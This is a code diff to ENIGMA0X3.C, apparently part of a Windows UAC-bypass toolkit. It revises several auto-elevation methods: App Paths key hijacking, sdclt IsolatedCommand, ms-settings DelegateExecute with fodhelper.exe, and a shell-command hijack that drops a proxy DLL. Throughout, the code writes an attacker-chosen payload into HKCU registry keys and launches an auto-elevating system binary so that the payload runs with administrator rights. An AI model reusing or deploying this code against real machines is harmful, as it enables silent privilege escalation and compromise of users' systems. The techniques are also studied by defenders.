@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     2.82
+*  VERSION:     2.85
 *
-*  DATE:        02 Nov 2017
+*  DATE:        01 Dec 2017
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -41,8 +41,8 @@ UCM_ENIGMA0x3_CTX g_EnigmaThreadCtx;
 BOOL ucmHijackShellCommandMethod(
     _In_opt_ LPWSTR lpszPayload,
     _In_ LPWSTR lpszTargetApp,
-    _In_ PVOID ProxyDll,
-    _In_ DWORD ProxyDllSize
+    _In_opt_ PVOID ProxyDll,
+    _In_opt_ DWORD ProxyDllSize
 )
 {
     BOOL    bCond = FALSE, bResult = FALSE;
@@ -73,6 +73,10 @@ BOOL ucmHijackShellCommandMethod(
         }
         else {
             //no payload specified, use default fubuki, drop dll first as wdscore.dll to %temp%
+            if ((ProxyDll == NULL) || (ProxyDllSize == 0)) {
+                SetLastError(ERROR_INVALID_DATA);
+                return FALSE;
+            }
             RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
             _strcpy(szBuffer, g_ctx.szTempDirectory);
             _strcat(szBuffer, WDSCORE_DLL);
@@ -325,7 +329,7 @@ BOOL ucmDiskCleanupRaceCondition(
 *
 */
 BOOL ucmAppPathMethod(
-    _In_opt_ LPWSTR lpszPayload,
+    _In_ LPWSTR lpszPayload,
     _In_ LPWSTR lpszAppPathTarget,
     _In_ LPWSTR lpszTargetApp
 )
@@ -333,9 +337,8 @@ BOOL ucmAppPathMethod(
     BOOL    bResult = FALSE, bCond = FALSE;
     LRESULT lResult;
     HKEY    hKey = NULL;
-    LPWSTR  lpKeyPath = NULL, lpBuffer = NULL;
+    LPWSTR  lpKeyPath = NULL;
     SIZE_T  sz;
-    WCHAR   szBuffer[MAX_PATH + 1];
 
 #ifndef _WIN64
     PVOID   OldValue = NULL;
@@ -357,27 +360,6 @@ BOOL ucmAppPathMethod(
 
     do {
 
-        sz = 0;
-        if (lpszPayload == NULL) {
-            sz = 0x1000;
-        }
-        else {
-            sz = (1 + _strlen(lpszPayload)) * sizeof(WCHAR);
-        }
-        lpBuffer = supHeapAlloc(sz);
-        if (lpBuffer == NULL)
-            break;
-
-        if (lpszPayload != NULL) {
-            _strcpy(lpBuffer, lpszPayload);
-        }
-        else {
-            //no payload specified, use default cmd.exe
-            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
-            _strcpy(lpBuffer, szBuffer);
-        }
-
         sz = (1 + _strlen(lpszAppPathTarget)) * sizeof(WCHAR) + sizeof(T_APP_PATH);
         lpKeyPath = supHeapAlloc(sz);
         if (lpKeyPath == NULL)
@@ -395,13 +377,13 @@ BOOL ucmAppPathMethod(
         // Set "Default" value as our payload.
         //
         if (lResult == ERROR_SUCCESS) {
-            sz = (1 + _strlen(lpBuffer)) * sizeof(WCHAR);
+            sz = (1 + _strlen(lpszPayload)) * sizeof(WCHAR);
             lResult = RegSetValueEx(
                 hKey,
                 TEXT(""),
                 0,
                 REG_SZ,
-                (BYTE*)lpBuffer,
+                (BYTE*)lpszPayload,
                 (DWORD)sz);
 
             //
@@ -418,9 +400,6 @@ BOOL ucmAppPathMethod(
 
     if (lpKeyPath != NULL)
         supHeapFree(lpKeyPath);
-
-    if (lpBuffer != NULL)
-        supHeapFree(lpBuffer);
 
     //
     // Reenable wow64 redirection if under wow64.
@@ -450,7 +429,7 @@ BOOL ucmAppPathMethod(
 *
 */
 BOOL ucmSdcltIsolatedCommandMethod(
-    _In_opt_ LPWSTR lpszPayload
+    _In_ LPWSTR lpszPayload
 )
 {
     BOOL    bResult = FALSE, bCond = FALSE, bExist = FALSE;
@@ -460,7 +439,6 @@ BOOL ucmSdcltIsolatedCommandMethod(
 #ifndef _WIN64
     PVOID   OldValue;
 #endif
-    LPWSTR  lpBuffer = NULL;
     LPWSTR  lpTargetValue = NULL;
     HKEY    hKey = NULL;
 
@@ -476,17 +454,7 @@ BOOL ucmSdcltIsolatedCommandMethod(
 
     do {
 
-        if (lpszPayload != NULL) {
-            lpBuffer = lpszPayload;
-        }
-        else {
-            //no payload specified, use default cmd.exe
-            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
-            lpBuffer = szBuffer;
-        }
-
-        sz = _strlen(lpBuffer);
+        sz = _strlen(lpszPayload);
 
         lResult = RegCreateKeyEx(HKEY_CURRENT_USER, T_EXEFILE_SHELL, 0, NULL,
             REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
@@ -507,6 +475,7 @@ BOOL ucmSdcltIsolatedCommandMethod(
             // Save old value if exist.
             //
             cbOldData = MAX_PATH * 2;
+            RtlSecureZeroMemory(&szOldValue, sizeof(szOldValue));
             lResult = RegQueryValueEx(hKey, lpTargetValue, 0, NULL,
                 (BYTE*)szOldValue, &cbOldData);
             if (lResult == ERROR_SUCCESS)
@@ -519,7 +488,7 @@ BOOL ucmSdcltIsolatedCommandMethod(
             hKey,
             lpTargetValue,
             0, REG_SZ,
-            (BYTE*)lpBuffer,
+            (BYTE*)lpszPayload,
             cbData);
 
         if (lResult == ERROR_SUCCESS) {
@@ -567,7 +536,7 @@ BOOL ucmSdcltIsolatedCommandMethod(
 *
 */
 BOOL ucmMsSettingsDelegateExecuteMethod(
-    _In_opt_ LPWSTR lpszPayload
+    _In_ LPWSTR lpszPayload
 )
 {
     BOOL    bResult = FALSE, bCond = FALSE;
@@ -577,11 +546,9 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
 #ifndef _WIN64
     PVOID   OldValue;
 #endif
-    LPWSTR  lpBuffer = NULL;
     HKEY    hKey = NULL;
 
-    WCHAR szBuffer[MAX_PATH + 1];
-    WCHAR szKey[MAX_PATH + 1];
+    WCHAR szTempBuffer[MAX_PATH + 1];
 
     //
     // Trigger application doesn't exist in wow64.
@@ -595,21 +562,11 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
 
     do {
 
-        if (lpszPayload != NULL) {
-            lpBuffer = lpszPayload;
-        }
-        else {
-            //no payload specified, use default cmd.exe
-            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
-            lpBuffer = szBuffer;
-        }
+        sz = _strlen(lpszPayload);
 
-        sz = _strlen(lpBuffer);
-
-        _strcpy(szKey, T_MSSETTINGS);
-        _strcat(szKey, T_SHELL_OPEN_COMMAND);
-        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKey, 0, NULL,
+        _strcpy(szTempBuffer, T_MSSETTINGS);
+        _strcat(szTempBuffer, T_SHELL_OPEN_COMMAND);
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szTempBuffer, 0, NULL,
             REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
 
         if (lResult != ERROR_SUCCESS)
@@ -618,13 +575,13 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
         //
         // Set empty DelegateExecute value.
         //
-        szKey[0] = 0;
+        szTempBuffer[0] = 0;
         cbData = 0;
         lResult = RegSetValueEx(
             hKey,
             T_DELEGATEEXECUTE,
             0, REG_SZ,
-            (BYTE*)szKey,
+            (BYTE*)szTempBuffer,
             cbData);
 
         if (lResult != ERROR_SUCCESS)
@@ -639,13 +596,13 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
             hKey,
             TEXT(""),
             0, REG_SZ,
-            (BYTE*)lpBuffer,
+            (BYTE*)lpszPayload,
             cbData);
 
         if (lResult == ERROR_SUCCESS) {
-            _strcpy(szBuffer, g_ctx.szSystemDirectory);
-            _strcat(szBuffer, FODHELPER_EXE);
-            bResult = supRunProcess(szBuffer, NULL);
+            _strcpy(szTempBuffer, g_ctx.szSystemDirectory);
+            _strcat(szTempBuffer, FODHELPER_EXE);
+            bResult = supRunProcess(szTempBuffer, NULL);
             supDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSSETTINGS);
         }
 
